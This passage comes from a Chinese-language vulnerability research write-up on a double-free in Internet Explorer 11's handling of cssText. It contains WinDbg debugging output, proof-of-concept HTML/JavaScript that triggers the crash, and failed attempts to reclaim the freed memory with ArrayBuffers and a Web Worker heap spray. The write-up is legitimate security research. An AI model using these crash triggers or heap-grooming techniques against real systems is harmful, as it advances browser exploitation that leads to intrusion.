+03adb970  04090300 6a3a5b4c 00000001 6b3fd8e4
+03adb980  04090300 6a3a5c58 00000002 03080c04
+03adb990  808c1f0a 8001140b 043cc748 00000006
+03adb9a0  808c1f0a 8001140b 043cc7f0 6b3fd988
+03adb9b0  84081f0a 8001140b 043cc780 043cc7aa
+03adb9c0  84081f0a 8001140b 043cc780 043cc7aa
+0:007&gt; du 043cc780 
+043cc780  "char strict auto auto"
+0:007&gt; du 043cc748 
+043cc748  "none fixed 49cp auto"
+</code></pre></div></div>
+
+<h3 id="尝试二设置csstext清空内存">尝试二：设置cssText清空内存</h3>
+
+<p>在分析漏洞原理时得知，每次设置新的cssText内容时，会先清除原本的字符串后再赋值新的字符串，因此利用该特性清除原本的字符串时应该也会产生崩溃。于是修改POC执行<code class="language-plaintext highlighter-rouge">elm.style.cssText = '';</code>，结果验证猜想，确实会产生崩溃：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0:007&gt; g
+Breakpoint 0 hit
+eax=00000004 ebx=0343a600 ecx=6a7145f0 edx=036ab500 esi=00000004 edi=036ab578
+eip=6e1b3027 esp=036ab4f8 ebp=036ab568 iopl=0         nv up ei pl zr na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
+jscript9!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x19a:
+6e1b3027 ff55e8          call    dword ptr [ebp-18h]  ss:002b:036ab550={MSHTML!CFastDOM::CNode::Trampoline_removeEventListener (6a7145f0)}
+0:007&gt; g
+Breakpoint 0 hit
+eax=00000001 ebx=03436990 ecx=6a3df860 edx=036ab308 esi=00000001 edi=036ab374
+eip=6e1b3027 esp=036ab300 ebp=036ab364 iopl=0         nv up ei pl zr na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
+jscript9!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x19a:
+6e1b3027 ff55e8          call    dword ptr [ebp-18h]  ss:002b:036ab34c={MSHTML!CFastDOM::CHTMLElement::Trampoline_Get_style (6a3df860)}
+0:007&gt; g
+Breakpoint 0 hit
+eax=00000002 ebx=03448b10 ecx=6a535d30 edx=036ab3f8 esi=00000002 edi=036ab46c
+eip=6e1b3027 esp=036ab3f0 ebp=036ab45c iopl=0         nv up ei pl zr na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
+jscript9!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x19a:
+6e1b3027 ff55e8          call    dword ptr [ebp-18h]  ss:002b:036ab444={MSHTML!CFastDOM::CCSSStyleDeclaration::Trampoline_Set_cssText (6a535d30)}
+0:007&gt; g						//重新设置cssText后由于释放了原本的cssText造成了doublefree
+Critical error detected c0000374
+(a4c.32c): Break instruction exception - code 80000003 (first chance)
+eax=00000000 ebx=00000000 ecx=77342c0e edx=036aadd9 esi=005f0000 edi=036b8768
+eip=7739e975 esp=036ab02c ebp=036ab0a4 iopl=0         nv up ei pl nz na po nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202
+ntdll!RtlReportCriticalFailure+0x29:
+7739e975 cc              int     3
+</code></pre></div></div>
+
+<p>接着打算利用addEventListener添加新的监听，使得在清除cssText时能够执行回调函数创建ArrayBuffer占用被释放的内存：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;html&gt;
+&lt;head&gt;
+        &lt;meta http-equiv="Expires" content="-1"&gt;
+&lt;head&gt;
+&lt;script&gt;
+	
+var iterationCount = 0;
+var R1 = new Array();	
+function testcase() {
+Math.atan2(1,0);
+elm = document.createElement('ins')
+func = function(e) {
+        iterationCount++;
+        switch (iterationCount) {
+                case 1:
+                case 2:
+                case 12:
+                case 22:
+                /*case 34:*/
+                        this.style.cssText = '-ms-layout-grid: char strict auto auto; -ms-layout-grid: none fixed 49cp auto;';
+                        break;
+        }
+}
+funcA = function(a) {
+        for(var i=0;i&lt;0x100;++i)
+		{
+			R1[i] = new ArrayBuffer(0x2c);
+		}
+
+}
+elm.addEventListener('DOMAttrModified', func, true)
+elm.className = 'AAAAAAAAA'
+elm.addEventListener('DOMAttrModified', funcA, true)
+elm.style.cssText = '';				//执行该语句会清空cssText，导致崩溃
+var view = new DataView(R1[0]);
+alert(view.byteLength);
+}
+&lt;/script&gt;
+
+&lt;body onload='testcase();'&gt;
+&lt;/html&gt;
+</code></pre></div></div>
+
+<p>然而调试后发现回调触发是在清空cssText之后，因此无法通过该种方式填充被释放的内存。</p>
+
+<h3 id="尝试三利用worker新建线程进行占位">尝试三：利用worker新建线程进行占位</h3>
+
+<p>在查阅worker新建线程时查看到<a href="https://exploiting.files.wordpress.com/2012/10/html5-heap-spray.pdf">html5-heap-spray</a>这篇文章，可以通过worker新建线程进行堆喷，这样在清除cssText时就有机会通过新线程创建的对象占位被释放的cssText实现UAF：</p>
+
+<p>修改后的poc.html：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;html&gt;
+&lt;head&gt;
+        &lt;meta http-equiv="Expires" content="-1"&gt;
+&lt;head&gt;
+&lt;script&gt;
+	
+var iterationCount = 0;
+function testcase() {
+elm = document.createElement('ins')
+func = function(e) {
+        iterationCount++;
+        switch (iterationCount) {
+                case 1:
+                case 2:
+                case 12:
+                case 22:
+                /*case 34:*/
+                        this.style.cssText = '-ms-layout-grid: char strict auto auto; -ms-layout-grid: none fixed 49cp auto;';
+                        break;
+        }
+}
+
+elm.addEventListener('DOMAttrModified', func, true);
+alert(1);
+elm.className = 'AAAAAAAAA';
+elm.removeEventListener('DOMAttrModified', func, true);
+var workers = new Worker('worker.js');
+var arr = new Arraybuffer(0x2c);
+workers.postMessage(arr);
+var arrview = new DataView(arr);
+elm.style.cssText = '';
+}
+&lt;/script&gt;
+
+&lt;body onload='testcase();'&gt;
+&lt;/html&gt;
+</code></pre></div></div>
+
+<p>worker.js:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>onmessage = function(e){
+	var a = Array();
+	for(var i = 0; i&lt;0x100; i++){
+		a[i] = new ArrayBuffer(0x2c);
+	}
+	postMessage(e);
+}
+</code></pre></div></div>
+
+<p>但是在调试过程中，执行到新建线程后程序便无法断下了，猜测没有创建正确的worker.js导致无法继续利用，利用尝试失败。</p>
+
+<p>于是验证IE11是否能正确使用web worker对象，编写的web worker代码如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>test.html:
+&lt;!DOCTYPE html&gt;
+&lt;html lang="en"&gt;
+&lt;head&gt;
+	&lt;title&gt;Web Worker&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+	&lt;p&gt;Web Worker is Counting Numbers&lt;/p&gt;
+
+	&lt;p&gt;Counting: &lt;output id="countM"&gt;&lt;/output&gt;&lt;/p&gt;
+
+	&lt;button onclick="alertMessage()"&gt;
+		Alert On
+	&lt;/button&gt;
+
+	&lt;script&gt;
+	
+		// This is function to run alert
+		function alertMessage() {
+			alert("Web Worker is Running in Background");
+		}
+
+		// Created a web worker and passed script which
+		// needs to execute in background
+		var worker = new Worker("worker.js");
+
+		// Called onmessage method to get value from
+		// script file and show it on web page
+		worker.onmessage = function (event) {
+			document.getElementById("countM")
+				.innerHTML = event.data;
+		};
+	&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+//------------------------------------------------------------
+
+worker.js:
+// Initialized a variable with 0
+var count = 0;
+
+function timedCount() {
+count = count + 1;
+	
+// It is used to send value
+// back to html page
+postMessage(count);
+	
+// It is a timeout function
+setTimeout("timedCount()",1000);
+}
+
+timedCount();
+</code></pre></div></div>
+
+<p>使用同样的代码在Chrome和Edge中均能正常执行：</p>
+
+<p><img src="https://blog-1257303866.cos.ap-guangzhou.myqcloud.com/img/image-20220630113303316.png" alt="image-20220630113303316" /></p>
+
+<p>然而在IE11中，web worker却无法正常执行，Counting没有正确显示：</p>
+
+<p><img src="https://blog-1257303866.cos.ap-guangzhou.myqcloud.com/img/image-20220630113426845.png" alt="image-20220630113426845" /></p>
+
+<p>可能由于IE11对于web worker的支持并不是很多，导致该种利用方式无法成功执行。</p>
+
+<h1 id="总结">总结</h1>
+
+<p>漏洞是因为cssText被递归设置导致内部字符串损坏，出现了两个指向同一个字符串的cssText，当再次重置cssText时，由于同一个字符串被释放两次造成了漏洞。利用思路可以通过新建线程在释放cssText时创建对象占用被释放的字符串内存，实现从doublefree到UAF。</p>
+
+<p>然而在实际利用过程中，对于IE多线程并不熟悉，web worker在IE11并不能正确执行，如果有其他方式能够创建多线程占位内存的话则能够利用该漏洞。</p>
+
+:ET
